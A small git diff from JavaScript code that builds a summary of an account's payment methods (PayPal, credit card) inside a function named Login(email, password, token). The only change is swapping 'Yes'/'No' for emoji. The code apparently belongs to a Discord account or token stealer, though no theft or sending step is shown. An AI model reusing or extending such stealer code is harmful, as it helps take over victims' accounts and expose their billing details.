@@ -201,17 +201,17 @@ function Login(email, password, token) {
                 var billing = "";
                 json.forEach(z => {
                     if (z.type == "") {
-                        return "\`No\`"
+                        return "\`❌\`"
                     } else if (z.type == 2 && z.invalid != !0) {
-                        billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
+                        billing += "\`✔️\`" + " <:paypal:896441236062347374>"
                     } else if (z.type == 1 && z.invalid != !0) {
-                        billing += "\`Yes\`" + " :credit_card:"
+                        billing += "\`✔️\`" + " :credit_card:"
                     } else {
-                        return "\`No\`"
+                        return "\`❌\`"
                     }
                 })
                 if (billing == "") {
-                    billing = "\`No\`"
+                    billing = "\`❌\`"
                 }
                 return billing
             }
